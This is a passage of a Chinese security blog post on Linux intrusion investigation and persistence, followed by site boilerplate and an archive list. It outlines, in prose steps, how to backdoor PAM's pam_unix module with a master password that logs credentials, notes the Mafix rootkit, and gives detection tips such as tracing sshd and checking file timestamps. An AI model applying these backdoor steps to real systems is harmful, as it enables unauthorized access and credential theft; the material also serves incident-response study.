+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、获取目标系统所使用的PAM版本，下载对应版本的pam版本</span><br><span class="line">2、解压缩，修改pam_unix_auth.c文件，添加万能密码</span><br><span class="line">3、编译安装PAM</span><br><span class="line">4、编译完后的文件在：modules&#x2F;pam_unix&#x2F;.libs&#x2F;pam_unix.so，复制到&#x2F;lib64&#x2F;security中进行替换，即可使用万能密码登陆，并将用户名密码记录到文件中。</span><br></pre></td></tr></table></figure>
+
+<p>排查技巧：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 1、通过Strace跟踪ssh</span><br><span class="line">ps axu | grep sshd</span><br><span class="line">strace -o aa -ff -p PID</span><br><span class="line">grep open aa* | grep -v -e No -e null -e denied| grep WR</span><br><span class="line"># 2、检查pam_unix.so的修改时间</span><br><span class="line">stat &#x2F;lib&#x2F;security&#x2F;pam_unix.so      #32位</span><br><span class="line">stat &#x2F;lib64&#x2F;security&#x2F;pam_unix.so    #64位</span><br></pre></td></tr></table></figure>
+
+<p><strong>10、rookit后门</strong></p>
+<p>Mafix是一款常用的轻量应用级别Rootkits，是通过伪造ssh协议漏洞实现远程登陆的特点是配置简单并可以自定义验证密码和端口号。</p>
+<p>利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。</p>
+<p>排查技巧：查看端口是否异常，RPM check查看命令是否被替换。</p>
+<p>参考链接：</p>
+<p>LINUX的两种后门总结(suid shell与inetd)</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/milantgh/p/3601812.html">https://www.cnblogs.com/milantgh/p/3601812.html</a></p>
+<p>linux后门总结</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zaqzzz/p/12099463.html">https://www.cnblogs.com/zaqzzz/p/12099463.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.secpulse.com/archives/100484.html">https://www.secpulse.com/archives/100484.html</a></p>
+<p>linux各种一句话反弹shell总结</p>
+<p><a target="_blank" rel="noopener" href="https://yq.aliyun.com/articles/519250?type=2">https://yq.aliyun.com/articles/519250?type=2</a></p>
+<p>Linux OpenSSH后门的添加与防范</p>
+<p><a target="_blank" rel="noopener" href="https://yq.aliyun.com/articles/69350">https://yq.aliyun.com/articles/69350</a></p>
+<p>Linux后门整理合集</p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/maplered/p/9224617.html">https://www.cnblogs.com/maplered/p/9224617.html</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/zlgxzswjy/p/6209571.html">https://www.cnblogs.com/zlgxzswjy/p/6209571.html</a></p>
+<p>linux 后门</p>
+<p><a target="_blank" rel="noopener" href="https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/">https://kevien.github.io/2019/02/16/linux%E5%B8%B8%E8%A7%81backdoor%E5%8F%8A%E6%8E%92%E6%9F%A5%E6%8A%80%E6%9C%AF/</a></p>
+<h1 id="Linux-实战"><a href="#Linux-实战" class="headerlink" title="Linux 实战"></a>Linux 实战</h1><p><a target="_blank" rel="noopener" href="https://bypass007.github.io/Emergency-Response-Notes/Linux/">https://bypass007.github.io/Emergency-Response-Notes/Linux/</a></p>
+<p>其他参考资料：</p>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/qjM7Fh0u0Edsz5C7L_ErGQ">https://mp.weixin.qq.com/s/qjM7Fh0u0Edsz5C7L_ErGQ</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>Author：<a href="https://hack-for.fun">m0nk3y</a>
+            <p>原文链接：<a href="https://hack-for.fun/e312198e.html">https://hack-for.fun/e312198e.html</a>
+            <p>发表日期：<a href="https://hack-for.fun/e312198e.html">September 4th 2020, 11:32:31 pm</a>
+            <p>更新日期：<a href="https://hack-for.fun/e312198e.html">September 7th 2020, 4:40:36 pm</a>
+            <p>版权声明：<b>原创文章转载时请注明出处</b></p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/54449ea6.html" title= "Windows 服务器应急响应">
+                    <div class="nextTitle">Windows 服务器应急响应</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/7881c78e.html" title= "CTF - 文件包含">
+                    <div class="prevTitle">CTF - 文件包含</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <div id="comment-container"></div>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.6.0/dist/gitalk.css">
+    <script src="https://cdn.jsdelivr.net/npm/gitalk@1.6.0/dist/gitalk.min.js"></script>
+    <script>
+        var gitalk = new Gitalk({
+            clientID: '6ceed9c245da8d33222a',
+            clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
+            id: '1599233551000',
+            repo: 'Gitalk',
+            owner: 'ifonly-go2019',
+            admin: "ifonly-go2019",
+            createIssueManually: true,
+            distractionFreeMode: false
+        })
+        gitalk.render('comment-container')
+    </script>
+    
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:ifonlysec@gmail.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="https://github.com/ifonly-go2019" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+    
+    <span id="busuanzi_container_site_uv">累计访客量: <span id="busuanzi_value_site_uv"></span> </span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">Linux 入侵排查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80"><span class="toc-number">1.0.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E6%80%9D%E8%B7%AF"><span class="toc-number">1.0.2.</span> <span class="toc-text">0x01 入侵排查思路</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-1-%E8%B4%A6%E5%8F%B7%E5%AE%89%E5%85%A8"><span class="toc-number">1.0.2.1.</span> <span class="toc-text">1.1 账号安全</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-2-%E5%8E%86%E5%8F%B2%E5%91%BD%E4%BB%A4"><span class="toc-number">1.0.2.2.</span> <span class="toc-text">1.2 历史命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-3-%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.0.2.3.</span> <span class="toc-text">1.3 检查异常端口</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-4-%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E8%BF%9B%E7%A8%8B"><span class="toc-number">1.0.2.4.</span> <span class="toc-text">1.4 检查异常进程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-5-%E6%A3%80%E6%9F%A5%E5%BC%80%E6%9C%BA%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">1.0.2.5.</span> <span class="toc-text">1.5 检查开机启动项</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-6-%E6%A3%80%E6%9F%A5%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.0.2.6.</span> <span class="toc-text">1.6 检查定时任务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-7-%E6%A3%80%E6%9F%A5%E6%9C%8D%E5%8A%A1"><span class="toc-number">1.0.2.7.</span> <span class="toc-text">1.7 检查服务</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-8-%E6%A3%80%E6%9F%A5%E5%BC%82%E5%B8%B8%E6%96%87%E4%BB%B6"><span class="toc-number">1.0.2.8.</span> <span class="toc-text">1.8 检查异常文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#1-9-%E6%A3%80%E6%9F%A5%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97"><span class="toc-number">1.0.2.9.</span> <span class="toc-text">1.9 检查系统日志</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E5%B7%A5%E5%85%B7%E7%AF%87"><span class="toc-number">1.0.3.</span> <span class="toc-text">0x02 工具篇</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-1-Rootkit%E6%9F%A5%E6%9D%80"><span class="toc-number">1.0.3.1.</span> <span class="toc-text">2.1 Rootkit查杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-2-%E7%97%85%E6%AF%92%E6%9F%A5%E6%9D%80"><span class="toc-number">1.0.3.2.</span> <span class="toc-text">2.2 病毒查杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-3-webshell%E6%9F%A5%E6%9D%80"><span class="toc-number">1.0.3.3.</span> <span class="toc-text">2.3 webshell查杀</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-4-RPM-check%E6%A3%80%E6%9F%A5"><span class="toc-number">1.0.3.4.</span> <span class="toc-text">2.4 RPM check检查</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-5-linux%E5%AE%89%E5%85%A8%E6%A3%80%E6%9F%A5%E8%84%9A%E6%9C%AC"><span class="toc-number">1.0.3.5.</span> <span class="toc-text">2.5 linux安全检查脚本</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">Linux 日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80-1"><span class="toc-number">2.0.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E6%97%A5%E5%BF%97%E7%AE%80%E4%BB%8B"><span class="toc-number">2.0.2.</span> <span class="toc-text">0x01 日志简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="toc-number">2.0.3.</span> <span class="toc-text">0x02 日志分析技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#A%E3%80%81%E5%B8%B8%E7%94%A8%E7%9A%84shell%E5%91%BD%E4%BB%A4"><span class="toc-number">2.0.3.1.</span> <span class="toc-text">A、常用的shell命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#B%E3%80%81%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E6%8A%80%E5%B7%A7"><span class="toc-number">2.0.3.2.</span> <span class="toc-text">B、日志分析技巧</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="toc-number">3.</span> <span class="toc-text">Linux 权限维持</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E8%97%8F%E7%AF%87"><span class="toc-number">3.1.</span> <span class="toc-text">隐藏篇</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x00-%E5%89%8D%E8%A8%80-2"><span class="toc-number">3.1.1.</span> <span class="toc-text">0x00 前言</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x01-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6"><span class="toc-number">3.1.2.</span> <span class="toc-text">0x01 隐藏文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x02-%E9%9A%90%E8%97%8F%E6%96%87%E4%BB%B6%E6%97%B6%E9%97%B4%E6%88%B3"><span class="toc-number">3.1.3.</span> <span class="toc-text">0x02 隐藏文件时间戳</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E9%9A%90%E8%97%8F%E6%9D%83%E9%99%90"><span class="toc-number">3.1.4.</span> <span class="toc-text">0x03 隐藏权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x04-%E9%9A%90%E8%97%8F%E5%8E%86%E5%8F%B2%E6%93%8D%E4%BD%9C%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.5.</span> <span class="toc-text">0x04 隐藏历史操作命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x05-%E9%9A%90%E8%97%8F%E8%BF%9C%E7%A8%8BSSH%E7%99%BB%E9%99%86%E8%AE%B0%E5%BD%95"><span class="toc-number">3.1.6.</span> <span class="toc-text">0x05 隐藏远程SSH登陆记录</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x06-%E7%AB%AF%E5%8F%A3%E5%A4%8D%E7%94%A8"><span class="toc-number">3.1.7.</span> <span class="toc-text">0x06 端口复用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-%E8%BF%9B%E7%A8%8B%E9%9A%90%E8%97%8F"><span class="toc-number">3.1.8.</span> <span class="toc-text">0x07 进程隐藏</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x07-%E7%BB%93%E8%AF%AD"><span class="toc-number">3.1.9.</span> <span class="toc-text">0x07 结语</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E9%97%A8%E7%AF%87"><span class="toc-number">3.2.</span> <span class="toc-text">后门篇</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Linux-%E5%AE%9E%E6%88%98"><span class="toc-number">4.</span> <span class="toc-text">Linux 实战</span></a></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 97
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2099 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/01</span><a class="archive-post-title" href= "/2986.html" >Recent arrangements</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/07</span><a class="archive-post-title" href= "/62d1.html" >Chrome 浏览器扩展开发初试</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/04</span><a class="archive-post-title" href= "/558a.html" >Cobalt Strike</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/24</span><a class="archive-post-title" href= "/abc8.html" >2020小组招新有感</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/18</span><a class="archive-post-title" href= "/63e5.html" >MacOS 如何修改账户名</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/22</span><a class="archive-post-title" href= "/5dcc.html" >CSS 注入学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/16</span><a class="archive-post-title" href= "/8d0f.html" >ThinkPHP5漏洞学习-文件包含漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/4fd81e40.html" >MacOS 下配置PHP代码审计环境，PHP调试学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/11</span><a class="archive-post-title" href= "/66043e4c.html" >WAF Bypass 姿势总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/09</span><a class="archive-post-title" href= "/fb2051a0.html" >CTF-XSS</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/936f84c6.html" >CTF-SSTI</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/07</span><a class="archive-post-title" href= "/54449ea6.html" >Windows 服务器应急响应</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/03</span><a class="archive-post-title" href= "/7881c78e.html" >CTF - 文件包含</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/30</span><a class="archive-post-title" href= "/dbb484a9.html" >CTF - RCE</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/30</span><a class="archive-post-title" href= "/103ec22a.html" >CTF - 文件上传</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/29</span><a class="archive-post-title" href= "/bc077bb7.html" >HTTP request smuggling(请求走私)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/27</span><a class="archive-post-title" href= "/a4738b93.html" >CTF Tricks 总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/56cfbe5.html" >PHP CVE、ThinkPHP、PhpMyAdmin、PHP 安全学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/56c2.html" >[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/25</span><a class="archive-post-title" href= "/43a3.html" >[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/15</span><a class="archive-post-title" href= "/b3d1.html" >Windows10 神舟U47T1 装Macos</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href= "/a703.html" >内网渗透初级学习笔记(一)-渗透测试流程</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href= "/e280.html" >一文小总结逻辑漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href= "/a78b.html" >关于Misc的一些小总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/13</span><a class="archive-post-title" href= "/6aac.html" >关于信息搜集的一些手段小总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/13</span><a class="archive-post-title" href= "/a04d.html" >[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/12</span><a class="archive-post-title" href= "/8143.html" >[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/11</span><a class="archive-post-title" href= "/fa95.html" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/3e2d.html" >[Untitled Post]</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
